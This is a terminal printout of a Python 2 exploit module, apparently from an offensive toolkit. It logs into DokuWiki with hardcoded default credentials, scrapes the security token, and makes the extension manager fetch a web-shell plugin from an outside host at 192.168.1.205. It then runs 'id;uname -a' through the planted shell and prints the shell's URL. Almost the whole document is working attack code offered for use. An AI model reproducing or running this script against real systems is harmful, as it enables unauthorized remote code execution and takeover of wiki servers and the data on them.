c@kali:~/src/napalm2.2/modules$ cat shell-dokuwiki.py
#!/usr/bin/env python
# shell-dokuwiki.py - module to upload shell, based on previous version
#   created 28.04.2017. Bug ('feature') is exploitable only
#   when you will have a valid credentials.
#   for this proof-of-concept you'll also need host with you.r/shell.zip
#

import sys
import re
import requests

print '[+] Module : dokuwiki - started.'

print
target = raw_input("[+] Hostname> ")
logMe = target + '/doku.php?id=start&do=login&sectok='
print

session = requests.session()
login_data = dict(u='user', p='bitnami')
req = session.post(logMe, data=login_data)

# 2nd req:
afterPage = target + '/doku.php?id=start&do=admin&page=extension&tab=install'
req2 = session.get(afterPage)

resp = req2.text
if 'Log Out' in resp:
  print '[+] We are logged-in as admin. Preparing shell...'


  req3 = session.get(afterPage)
  resp3 = req3.text

  pattern = re.compile('<input type="hidden" name="sectok" value="(.*?)"/>')
  found = re.search(pattern, resp3)

  if found:
    sectok = found.group(1)
    print '[+] Found "sectok":' + str( sectok )
    print '[+] Preparing shell params to upload'

    data_shell = {
        'sectok':sectok,
        'installurl':'http://192.168.1.205/mishell.zip'
    }
    reqshell = session.post(afterPage, data=data_shell)
    respshell = reqshell.text

    md5name = re.compile('<div class="success">Plugin (.*?) installed successfully</div>')
    foundmishell = re.search(md5name, respshell)

    if foundmishell:
      print '[+] Mishell name:' + str( foundmishell.group(1))

      shellUrl = target + '/lib/plugins/'+foundmishell.group(1)+'/mishell.php?x=id;uname -a'
      verify = session.get(shellUrl)
      vtext = verify.text

      print '  ',vtext
      print ''
      print '[+] Your shell should be here:', shellUrl

## can not log in
  else:
    print '[-] Can not login. Something is wrong :C'


print '[+] Module : dokuwiki - finished.'

